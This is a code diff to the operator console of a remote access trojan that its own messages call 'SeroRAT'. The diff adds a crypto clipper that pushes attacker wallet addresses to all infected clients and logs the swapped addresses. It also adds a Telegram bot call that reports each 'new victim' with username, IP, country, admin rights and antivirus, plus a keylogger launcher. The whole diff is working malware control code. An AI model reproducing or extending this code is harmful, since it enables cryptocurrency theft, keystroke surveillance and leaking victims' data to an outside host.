@@ -166,6 +166,141 @@ public partial class ServerWindow : Window
         public System.Windows.Media.Brush ScoreColor { get; set; } = System.Windows.Media.Brushes.Black;
     }
 
+    // ── Crypto Clipper (global — applies to all clients) ────────────────────────
+    private bool _clipperRunning;
+    private int  _clipperCount;
+
+    private ClipperSetConfigData BuildClipperConfig(bool enabled) => new()
+    {
+        Enabled = enabled,
+        Addresses = new ClipperAddresses
+        {
+            BTC  = ClipperBTC.Text.Trim(),
+            ETH  = ClipperETH.Text.Trim(),
+            LTC  = ClipperLTC.Text.Trim(),
+            TRX  = ClipperTRX.Text.Trim(),
+            SOL  = ClipperSOL.Text.Trim(),
+            XMR  = ClipperXMR.Text.Trim(),
+            XRP  = ClipperXRP.Text.Trim(),
+            DASH = ClipperDASH.Text.Trim(),
+            BCH  = ClipperBCH.Text.Trim(),
+        }
+    };
+
+    private async void ClipperStart_Click(object sender, RoutedEventArgs e)
+    {
+        _clipperRunning = true;
+        BtnClipperStart.IsEnabled = false; BtnClipperStart.Opacity = 0.45;
+        BtnClipperStop.IsEnabled  = true;  BtnClipperStop.Opacity  = 1.0;
+        ClipperActiveBadge.Visibility = Visibility.Visible;
+        // Push config to all currently online clients
+        if (_server != null)
+        {
+            var pkt = new Packet
+            {
+                Type = PacketType.ClipperSetConfig,
+                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true))
+            };
+            await _server.SendToAll(pkt);
+            Log($"[CLIPPER] Started — config pushed to {_server.ConnectedClients.Count} client(s).");
+        }
+        SaveConfig();
+    }
+
+    private async void ClipperStop_Click(object sender, RoutedEventArgs e)
+    {
+        _clipperRunning = false;
+        BtnClipperStart.IsEnabled = true;  BtnClipperStart.Opacity = 1.0;
+        BtnClipperStop.IsEnabled  = false; BtnClipperStop.Opacity  = 0.45;
+        ClipperActiveBadge.Visibility = Visibility.Collapsed;
+        if (_server != null)
+        {
+            var pkt = new Packet
+            {
+                Type = PacketType.ClipperSetConfig,
+                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(false))
+            };
+            await _server.SendToAll(pkt);
+            Log("[CLIPPER] Stopped — all clients notified.");
+        }
+    }
+
+    private void ClipperEnabled_Changed(object sender, RoutedEventArgs e) { }
+
+    private void ClipperApply_Click(object sender, RoutedEventArgs e) { }
+
+    private void ClipperClearLog_Click(object sender, RoutedEventArgs e)
+    {
+        ClipperLog.Clear();
+        _clipperCount = 0;
+        ClipperCountTxt.Text = "  —  0 replacements";
+    }
+
+    private void HandleClipperDetected(string clientId, Protocol.ClipperDetectedData data)
+    {
+        _clipperCount++;
+        var display = clientId.Length > 8 ? clientId[..8] : clientId;
+        var line = $"[{DateTime.Now:HH:mm:ss}]  [{display}]  {data.Type}  {data.Original}  →  {data.Replaced}\n";
+        ClipperLog.AppendText(line);
+        ClipperLogScroll.ScrollToEnd();
+        ClipperCountTxt.Text = $"  —  {_clipperCount} replacement{(_clipperCount != 1 ? "s" : "")}";
+        Log($"[CLIPPER] {data.Type} replaced on {display}");
+    }
+
+    // ── Server-side Telegram notification (global counter) ──────────────────────
+    // Fires when a brand-new HWID connects — uses the server's DataStore count
+    // so the number is truly global across all victims, not per-machine.
+    private async Task ServerTelegramNotifyAsync(Data.ConnectedClient c)
+    {
+        try
+        {
+            var token   = BldTelegramToken.Text.Trim();
+            var chatId1 = BldTelegramChatId1.Text.Trim();
+            var chatId2 = BldTelegramChatId2.Text.Trim();
+            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;
+
+            // Global count = total unique HWIDs the server has ever seen
+            int count = _store.AllClients.Count;
+
+            var prefix  = !string.IsNullOrEmpty(c.Payload) ? c.Payload : c.MachineName;
+            var admin   = c.IsAdmin ? "Yes" : "No";
+            var country = string.IsNullOrEmpty(c.Country) ? "N/A" : c.Country;
+            var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
+            var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz)
+                              .ToString("yyyy-MM-dd HH:mm") + " (Paris)";
+
+            var msg =
+                $"New victim #{count} - SeroRAT\n\n" +
+                $"ID: {c.Id}\n" +
+                $"User: {c.Username}@{c.MachineName}\n" +
+                $"Local IP: {c.IP}\n" +
+                $"Public IP: {c.IP}\n" +
+                $"Country: {country}\n" +
+                $"OS: {c.OS}\n" +
+                $"Admin: {admin}\n" +
+                $"AV: {c.Antivirus}\n" +
+                $"Payload: {prefix}\n" +
+                $"Time: {paris}";
+
+            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
+            var targets = new List<string> { chatId1 };
+            if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);
+
+            foreach (var id in targets)
+            {
+                try
+                {
+                    var url = $"https://api.telegram.org/bot{token}/sendMessage" +
+                              $"?chat_id={Uri.EscapeDataString(id)}" +
+                              $"&text={Uri.EscapeDataString(msg)}";
+                    await http.GetAsync(url);
+                }
+                catch { }
+            }
+        }
+        catch { }
+    }
+
     // ── Server Control ──────────────────────────────
 
     private void StartStop_Click(object sender, RoutedEventArgs e)
@@ -204,11 +339,23 @@ public partial class ServerWindow : Window
                 _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                 _server.ClientConnected += c => Dispatcher.BeginInvoke(async () =>
                 {
+                    bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
+                                     || rec.ActivityLog.Count <= 1; // first connection ever
                     _onlineClients.Add(c);
                     _clientsDirty = true;
                     UpdateClientCount();
                     if (_autoTasks.Count > 0)
                         await ExecuteAutoTasksForClient(c);
+                    // Server-side Telegram: fires with the true global victim count
+                    if (isNewHwid && BldTelegramEnabled.IsChecked == true)
+                        _ = ServerTelegramNotifyAsync(c);
+                    // Push clipper config automatically if running
+                    if (_clipperRunning && _server != null)
+                        await _server.SendToClient(c.Id, new Packet
+                        {
+                            Type = PacketType.ClipperSetConfig,
+                            Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true))
+                        });
                 });
                 _server.ClientDisconnected += c => Dispatcher.BeginInvoke(() =>
                 {
@@ -223,6 +370,10 @@ public partial class ServerWindow : Window
                     Log($"[UAC] Client {clientId}: {status} - {data.Message}");
                     if (data.Success) RefreshClients();
                 });
+
+                // Crypto Clipper detections → global Clipper tab log
+                _server.ClipperDetectedReceived += (clientId, data) =>
+                    Dispatcher.BeginInvoke(() => HandleClipperDetected(clientId, data));
 
                 // Log autotask shell output separately (not routed to RemoteShellWindow)
                 _server.AutoTaskShellOutputReceived += (clientId, output) => Dispatcher.BeginInvoke(() =>
@@ -529,6 +680,26 @@ public partial class ServerWindow : Window
         foreach (var c in clients)
             OpenFeatureWindow<FunWindow>(c.Id, () =>
                 new FunWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+    }
+
+    private void Keylogger_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+            OpenFeatureWindow<KeyloggerWindow>(c.Id, () =>
+                new KeyloggerWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+        Log($"[*] Keylogger opened for {clients.Count} client(s).");
+    }
+
+    private void CryptoClipper_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+            OpenFeatureWindow<CryptoClipperWindow>(c.Id, () =>
+                new CryptoClipperWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+        Log($"[*] Crypto Clipper opened for {clients.Count} client(s).");
     }
 
     private async void Hvnc_Click(object sender, RoutedEventArgs e)
@@ -1062,6 +1233,17 @@ public partial class ServerWindow : Window
             if (cfg.TryGetValue("TelegramChatId2", out var tc2)) BldTelegramChatId2.Text = tc2;
             if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) BldMnrStatsToken.Text = mst;
 
+            // Crypto Clipper
+            if (cfg.TryGetValue("ClipperBTC",  out var cBtc))  ClipperBTC.Text  = cBtc;
+            if (cfg.TryGetValue("ClipperETH",  out var cEth))  ClipperETH.Text  = cEth;
+            if (cfg.TryGetValue("ClipperLTC",  out var cLtc))  ClipperLTC.Text  = cLtc;
+            if (cfg.TryGetValue("ClipperTRX",  out var cTrx))  ClipperTRX.Text  = cTrx;
+            if (cfg.TryGetValue("ClipperSOL",  out var cSol))  ClipperSOL.Text  = cSol;
+            if (cfg.TryGetValue("ClipperXMR",  out var cXmr))  ClipperXMR.Text  = cXmr;
+            if (cfg.TryGetValue("ClipperXRP",  out var cXrp))  ClipperXRP.Text  = cXrp;
+            if (cfg.TryGetValue("ClipperDASH", out var cDash)) ClipperDASH.Text = cDash;
+            if (cfg.TryGetValue("ClipperBCH",  out var cBch))  ClipperBCH.Text  = cBch;
+
             Log("[+] Builder config loaded.");
         }
         catch { }
@@ -1103,6 +1285,15 @@ public partial class ServerWindow : Window
                 ["TelegramChatId1"] = BldTelegramChatId1.Text.Trim(),
                 ["TelegramChatId2"] = BldTelegramChatId2.Text.Trim(),
                 ["MnrStatsToken"] = BldMnrStatsToken.Text.Trim(),
+                ["ClipperBTC"]  = ClipperBTC.Text.Trim(),
+                ["ClipperETH"]  = ClipperETH.Text.Trim(),
+                ["ClipperLTC"]  = ClipperLTC.Text.Trim(),
+                ["ClipperTRX"]  = ClipperTRX.Text.Trim(),
+                ["ClipperSOL"]  = ClipperSOL.Text.Trim(),
+                ["ClipperXMR"]  = ClipperXMR.Text.Trim(),
+                ["ClipperXRP"]  = ClipperXRP.Text.Trim(),
+                ["ClipperDASH"] = ClipperDASH.Text.Trim(),
+                ["ClipperBCH"]  = ClipperBCH.Text.Trim(),
             };
             File.WriteAllText(path, Newtonsoft.Json.JsonConvert.SerializeObject(cfg, Newtonsoft.Json.Formatting.Indented));
             Log($"[+] Config saved to {path}");
